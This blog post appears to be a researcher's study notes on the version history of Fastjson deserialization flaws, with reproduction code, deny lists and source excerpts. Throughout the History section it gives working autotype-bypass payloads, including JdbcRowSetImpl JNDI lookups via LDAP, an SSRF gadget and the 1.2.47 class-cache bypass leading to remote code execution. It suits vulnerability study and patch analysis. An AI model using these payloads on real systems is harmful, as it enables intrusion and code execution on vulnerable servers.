---
layout: post
title: LIFECYCLE of FASTJSON
categories: [Research]
tags: [FastJson,JAVA]
description: Something about FastJson
---

![mapjson](https://dangkhai0x21.github.io/assets/media/forpost/lifecycle-fast/jsonmapjson.PNG)

### Brief intro:

* Is

  Fastjson is a json library maintained by Alibaba. It uses an algorithm of "assuming ordered fast matching" and is known as the fastest json library in Java.

  FastJson turn on autotype to allow `ParseObject` from map Object can be customize by attacker follow gadget chain in libs exist on project. 

* Ref

  ​ [1] [Fastjson process analysis](https://paper.seebug.org/994/)

  ​ [2] [Fastjson-deserialization-vulnerability-history](https://medium.com/@knownsec404team/fastjson-deserialization-vulnerability-history-5206714ceed1)

  ​ [3] [FastJson deserialization learning](http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/#v1-2-47)

  ​ [4] [JNDI Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)

* Self Question

```
1. Attributes can customize by attacker or base on format deserialize of lib ?
2. What is the whitelist and blacklist.
3. Why `@type` exist many times in payload
4. What is `val`.
```

### Read & Practice

- LifeCycle

```
<1.2.24: 
-Autotype enable default
-DenyList=[java.lang.Thread]

1.2.25:
-Autotype disable default
-DenyList=[bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework]
-Add function checkAutoType

1.2.42:
-DenyList=[-8720046426850100497L, -8109300701639721088L, -7966123100503199569L, -7766605818834748097L, -6835437086156813536L, -4837536971810737970L, -4082057040235125754L, -2364987994247679115L, -1872417015366588117L, -254670111376247151L, -190281065685395680L, 33238344207745342L, 313864100207897507L, 1203232727967308606L, 1502845958873959152L, 3547627781654598988L, 3730752432285826863L, 3794316665763266033L, 4147696707147271408L, 5347909877633654828L, 5450448828334921485L, 5751393439502795295L, 5944107969236155580L, 6742705432718011780L, 7179336928365889465L, 7442624256860549330L, 8838294710098435315L]

1.2.61:
-DenyList from Decimal convert to hex
```

* ListToken

{% highlight java %}
    public final static int ERROR                = 1;
    public final static int LITERAL_INT          = 2;
    public final static int LITERAL_FLOAT        = 3;
    public final static int LITERAL_STRING       = 4;
    public final static int LITERAL_ISO8601_DATE = 5;
    public final static int TRUE                 = 6;
    public final static int FALSE                = 7;
    public final static int NULL                 = 8;
    public final static int NEW                  = 9;
    public final static int LPAREN               = 10; // ("("),
    public final static int RPAREN               = 11; // (")"),
    public final static int LBRACE               = 12; // ("{"),
    public final static int RBRACE               = 13; // ("}"),
    public final static int LBRACKET             = 14; // ("["),
    public final static int RBRACKET             = 15; // ("]"),
    public final static int COMMA                = 16; // (","),
    public final static int COLON                = 17; // (":"),
    public final static int IDENTIFIER           = 18;
    public final static int FIELD_NAME           = 19;
    public final static int EOF                  = 20;
    public final static int SET                  = 21;
    public final static int TREE_SET             = 22;
    public final static int UNDEFINED            = 23; // undefined
    public final static int SEMI                 = 24;
    public final static int DOT                  = 25;
    public final static int HEX                  = 26;
{% endhighlight %}

* Stacktrace

```java
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
setValue:110, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:75, ArrayListTypeFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:838, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseRest:1573, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:-1, FastjsonASMDeserializer_1_WadlGenerator (com.alibaba.fastjson.parser.deserializer)
deserialze:284, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:395, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1401, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1367, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:183, JSON (com.alibaba.fastjson)
parse:193, JSON (com.alibaba.fastjson)
parse:149, JSON (com.alibaba.fastjson)
main:35, ApacheCxfSSRFPoc (com.threedr3am.bug.fastjson.ssrf)
```

* Vulnerable class : DefaultJSONParser.class

* Payload example

  ```
  {\"@type\":\"org.apache.cxf.jaxrs.model.wadl.WadlGenerator\",\"schemaLocations\": \"http://127.0.0.1:8009?a=1&b=22222\"}
  ```

* Struct

```
- @Type here corresponds to the commonly autotype function , simply understood that fastjson will automatically map the value of key: value of json to the class corresponding to @type.
```

* Convert character to `hashCode`

{% highlight java %}
public class Main {
  public static void main(String[] args) {
        long hash = 1872244109670850393L;
        long vIn = 46L;
        char key = (char)vIn;
        hash ^= (long)key;
        hash *= 1099511628211L;
        System.out.println(hash);
  }
}
{% endhighlight %}

```java
acceptHashCodes={}
denyHashCodes=[-9164606388214699518, -8720046426850100497, -8649961213709896794, -8165637398350707645, -8109300701639721088, -7966123100503199569, -7921218830998286408, -7775351613326101303, -7768608037458185275, -7766605818834748097, -6835437086156813536, -6316154655839304624, -6179589609550493385, -6025144546313590215, -5939269048541779808, -5885964883385605994, -5764804792063216819, -5472097725414717105, -5194641081268104286, -4837536971810737970, -4608341446948126581, -4438775680185074100, -4082057040235125754, -3975378478825053783, -3935185854875733362, -3319207949486691020, -3077205613010077203, -2825378362173150292, -2439930098895578154, -2378990704010641148, -2364987994247679115, -2262244760619952081, -2192804397019347313, -2095516571388852610, -1872417015366588117, -1650485814983027158, -1589194880214235129, -905177026366752536, -831789045734283466, -582813228520337988, -254670111376247151, -190281065685395680, -26639035867733124, -9822483067882491, 4750336058574309, 33238344207745342, 218512992947536312, 313864100207897507, 386461436234701831, 823641066473609950, 1073634739308289776, 1153291637701043748, 1203232727967308606, 1459860845934817624, 1502845958873959152, 1534439610567445754, 1698504441317515818, 1818089308493370394, 2078113382421334967, 2164696723069287854, 2653453629929770569, 2660670623866180977, 2731823439467737506, 2836431254737891113, 3089451460101527857, 3114862868117605599, 3256258368248066264, 3547627781654598988, 3637939656440441093, 3688179072722109200, 3718352661124136681, 3730752432285826863, 3794316665763266033, 4046190361520671643, 4147696707147271408, 4254584350247334433, 4814658433570175913, 4841947709850912914, 4904007817188630457, 5100336081510080343, 5274044858141538265, 5347909877633654828, 5450448828334921485, 5474268165959054640, 5596129856135573697, 5688200883751798389, 5751393439502795295, 5944107969236155580, 6007332606592876737, 6280357960959217660, 6456855723474196908, 6511035576063254270, 6534946468240507089, 6734240326434096246, 6742705432718011780, 6854854816081053523, 7123326897294507060, 7179336928365889465, 7375862386996623731, 7442624256860549330,7658177784286215602,8055461369741094911,8389032537095247355,8409640769019589119,8488266005336625107,8537233257283452655,8838294710098435315,9140390920032557669,9140416208800006522]
```

### Code to rebuild

**Reproduce from article [3]**

Create project java with java framework, this is source code .

*pom.xml* . Change version of fastJson into tag `version` in pom.xml to download.

{% highlight java %}
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>groupId</groupId>
    <artifactId>history-fastjson</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>
    <dependencies>
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.23</version>
        </dependency>
    </dependencies>
</project>
{% endhighlight %}

*Testfastjson.java*

{% highlight java %}
package khaind.fj;

import java.util.HashMap;
import java.util.Map;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.serializer.SerializerFeature;

public  class  Testfastjson  {

    public static void main(String[] args){
        Map<String, Object> map = new HashMap<String, Object>();
        map.put("key1","One");
        map.put("key2", "Two");
        String mapJson = JSON.toJSONString(map);
        System.out.println(mapJson);

        User user1 = new User();
        user1.setName("khaind");
        user1.setAge(12);
        System.out.println("obj name:"+user1.getClass().getName());

//序列化
        String serializedStr = JSON.toJSONString(user1);
        System.out.println("serializedStr="+serializedStr);

        String serializedStr1 = JSON.toJSONString(user1,SerializerFeature.WriteClassName);
        System.out.println("serializedStr1="+serializedStr1);

//Deserialize through the parse method
        User user2 = (User)JSON.parse(serializedStr1);
        System.out.println(user2.getName());
        System.out.println();

//Deserialize through the parseObject method. What is returned by this method is a JSONObject
        Object obj = JSON.parseObject(serializedStr1);
        System.out.println(obj);
        System.out.println( "obj name:" +obj .getClass().getName()+ "\n" );

//Returned in this way is a corresponding class object
        Object obj1 = JSON.parseObject(serializedStr1,Object.class ) ;
        System.out.println(obj1);
        System.out.println( "obj1 name:" +obj1 .getClass().getName());

    }
}
{% endhighlight %}

*User.java*

{% highlight java %}
package khaind.fj;

public class User {
    private String name;
    private int age;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }
}
{% endhighlight %}

*Test.java*

{% highlight java %}
package khaind.fj;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

public class Test {
    public static void main(String[] args) {
        String myJSON = "{\"@type\":\"khaind.fj.User\",\"age\":12,\"name\":\"khaind\"}";
        JSONObject u3 = JSON.parseObject(myJSON);
        System.out.println("result => " + u3.get("name"));
    }
}
{% endhighlight %}



### History

#### early 1.2.24

- Using gadget in `Apache CXF JAX-RS Bundle Jar` to triggle `ssrf`.

{% highlight java %}
<dependency>
    <groupId>org.apache.cxf</groupId>
    <artifactId>cxf-bundle-jaxrs</artifactId>
    <version>2.6.6</version>
</dependency>
{% endhighlight %}

​   

- Payload:

```
{"@type":"org.apache.cxf.jaxrs.model.wadl.WadlGenerator","schemaLocations":"http://127.0.0.1:8001/pwned"}
```

--------

#### 1.2.25 - 1.2.41

- Enable AutoType

```
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```

- Payload:

```
{\"@type\": \"Lcom.sun.rowset.JdbcRowSetImpl;\", \"dataSourceName\": \"ldap://127.0.0.1:1389/w17ii2\",\"autoCommit\": true\ "}
```

- Explain:

`-` According DenyList, `com.sun` exists array, So with clazz `Lcom.sun.rowset.JdbcRowSetImpl;` . It will have to go through some screening steps later to bypass.

Step 1:

com\alibaba\fastjson\parser\ParserConfig.class

{% highlight java %}
 for(i = 0; i < this.denyList.length; ++i) {
                    deny = this.denyList[i];
                    if (className.startsWith(deny)) {
                        throw new JSONException("autoType is not support. " + typeName);
                }
       }      
{% endhighlight %}

> Lcom.sun -> passed -> clazz name still is Lcom.sun.rowset.JdbcRowSetImpl;

Step 2:

com\alibaba\fastjson\util\TypeUtils.class

{% highlight java %}
           } else if (className.startsWith("L") && className.endsWith(";")) {
                String newClassName = className.substring(1, className.length() - 1);
                return loadClass(newClassName, classLoader);
{% endhighlight %}

> Lcom.sun -> replace -> com.sun.rowset.JdbcRowSetImpl

Bypass success.

----

#### 1.2.41

* Payload:

```
{\"@type\": \"LLcom.sun.rowset.JdbcRowSetImpl;;\", \"dataSourceName\":\"ldap://127.0.0.1:1389/w17ii2\",\"autoCommit\": true\ "}
```

- Explain:

`-` According DenyList, `com.sun` exists array, So with clazz `LLcom.sun.rowset.JdbcRowSetImpl;;` . It will have to go through some screening steps later to bypass.

Step 1:

com\alibaba\fastjson\parser\ParserConfig.class

{% highlight java %}
if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
                className = className.substring(1, className.length() - 1);}
{% endhighlight %}

> LLcom.sun.rowset.JdbcRowSetImpl;; -> substring -> Lcom.sun.rowset.JdbcRowSetImpl;

Step 2:

com\alibaba\fastjson\parser\ParserConfig.class

{% highlight java %}
                        if (Arrays.binarySearch(this.denyHashCodes, hash) >= 0) {
                            throw new JSONException("autoType is not support. " + typeName);
                        }    
{% endhighlight %}

> Lcom.sun.rowset.JdbcRowSetImpl; -> passed -> clazz name still is Lcom.sun.rowset.JdbcRowSetImpl;

Step 3:

com\alibaba\fastjson\util\TypeUtils.class

{% highlight java %}
           } else if (className.startsWith("L") && className.endsWith(";")) {
                String newClassName = className.substring(1, className.length() - 1);
                return loadClass(newClassName, classLoader);
{% endhighlight %}

> Lcom.sun.rowset.JdbcRowSetImpl; -> replace -> com.sun.rowset.JdbcRowSetImpl

Bypass success.

----

#### 1.2.43

* Payload:

```
{"@type": "[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName": "ldap://127.0.0.1:1389/w17ii2",autoCommit: true]]}
```

- Explain:

  Step 1:

  com\alibaba\fastjson\parser\ParserConfig.class

{% highlight java %}
                          if (Arrays.binarySearch(this.denyHashCodes, hash) >= 0) {
                              throw new JSONException("autoType is not support. " + typeName);
                          }    
{% endhighlight %}

  > [com.sun -> passed -> clazz name still is [com.sun.rowset.JdbcRowSetImpl

  Step 2:

  com\alibaba\fastjson\util\TypeUtils.class

{% highlight java %}
              } else if (className.charAt(0) == '[') {
                  Class<?> componentType = loadClass(className.substring(1), classLoader);
                  return Array.newInstance(componentType, 0).getClass();
              }
{% endhighlight %}

  >  [com.sun.rowset.JdbcRowSetImpl;> passed-> com.sun.rowset.JdbcRowSetImpl

Bypass success.

---

#### 1.2.44

* Patch

com\alibaba\fastjson\parser\ParserConfig.class

{% highlight java %}
long h1 = (-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L;            
if (h1 == -5808493101479473382L) {
                throw new JSONException("autoType is not support. " + typeName);}
{% endhighlight %}

Check className[0] == `[` will response exception.

---

#### 1.2.45 - 1.2.46

* Patch

 A blacklist was added and no checkAutotype bypass occurred.

---

#### 1.2.47

***Why `@type` exist many times in payload***

^ @type can exists many fitmes because this is a part of `feature` autoType. This can be mapping `key: value` with key(@type) is class(value).

**<u>*What is `val`.*</u>**

^ This is a step to bypass this version.It took quite a while to figure out how to bypass this version according to other articles.

* Payload:

{% highlight java %}
                "{\n" +
                "    \"t1\": {\n" +
                "        \"@type\": \"java.lang.Class\", \n" +
                "        \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "    }, \n" +
                "    \"t2\": {\n" +
                "        \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \n" +
                "        \"dataSourceName\": \"ldap://127.0.0.1:1389/w17ii2\", \n" +
                "        \"autoCommit\": true\n" +
                "    }\n" +
                "}"
{% endhighlight %}

* Explain:

With `t1` , `java.lang.Class` passed `checkAutoType` because this not exist in `denyHashCode`. So next step to help `t2` passed `checkAutoType`. Look!

com\alibaba\fastjson\serializer\MiscCodec.class

{% highlight java %}
                if (!"val".equals(lexer.stringVal())) {
                    throw new JSONException("syntax error");
                }

                lexer.nextToken();
                parser.accept(17);
                objVal = parser.parse();
                parser.accept(13);
{% endhighlight %}

Handle `key` (val) to get string base on `substring`. Value is `com.sun.rowset.JdbcRowSetImpl`.

It called loadClass(), becareful with here!

com\alibaba\fastjson\serializer\MiscCodec.class

{% highlight java %}
if (clazz == Class.class) {
    return TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());
{% endhighlight %}

com\alibaba\fastjson\util\TypeUtils.class

{% highlight java %}
    public static Class<?> loadClass(String className, ClassLoader classLoader) { //1
        return loadClass(className, classLoader, true);
    }

    public static Class<?> loadClass(String className, ClassLoader classLoader, boolean cache) {//2
        if (className != null && className.length() != 0) {
            Class<?> clazz = (Class)mappings.get(className);
            if (clazz != null) {
                return clazz;
                ...
{% endhighlight %}

It consists of two identical but different loadclass classes in the number of parameters passed. Notice it, in other versions, the loadClass calls from ParserConfig called loadClass () //2 with the cache false, as when called at MiscCodec.class it will call loadclass() at 1 so it can be cached set it to True.Then called loadclass() //2

com\alibaba\fastjson\util\TypeUtils.class

{% highlight java %}
                        clazz = classLoader.loadClass(className);
                        if (cache) {//
                            mappings.put(className, clazz);
                        }
{% endhighlight %}

Mapping obj is `com.sun.rowset.JdbcRowSetImpl` into `map` with key is `t1`. `break point 1`

com\alibaba\fastjson\parser\ParserConfig.class

{% highlight java %}
                if (Arrays.binarySearch(this.denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null) {
                            throw new JSONException("autoType is not support. " + typeName);
                        }
{% endhighlight %}

Although `Arrays.binarySearch(this.denyHashCodes, hash) >= 0` => `true` but `TypeUtils.getClassFromMapping(typeName) == null` => `false` from `break point 1`.

com\alibaba\fastjson\serializer\MiscCodec.class

{% highlight java %}
   if (clazz == Class.class) { // clazz: "class. java.lang.Class"
return TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());}
{% endhighlight %}

It called loadClass(), becareful with here!

com\alibaba\fastjson\util\TypeUtils.class

{% highlight java %}
    public static Class<?> loadClass(String className, ClassLoader classLoader) {
        return loadClass(className, classLoader, true);
    }

    public static Class<?> loadClass(String className, ClassLoader classLoader, boolean cache) {
        if (className != null && className.length() != 0) {
            Class<?> clazz = (Class)mappings.get(className);
            if (clazz != null) {
                return clazz;
                ...
{% endhighlight %}

com\alibaba\fastjson\parser\ParserConfig.class

{% highlight java %}
                if (Arrays.binarySearch(this.denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null) {
                            throw new JSONException("autoType is not support. " + typeName);
                        }
{% endhighlight %}

Although `Arrays.binarySearch(this.denyHashCodes, hash) >= 0` => `true` but `TypeUtils.getClassFromMapping(typeName) == null` => `false` 

`t2` bypass `checkAutoType` and `t2` is last chain to trigger RCE.

Bypass success.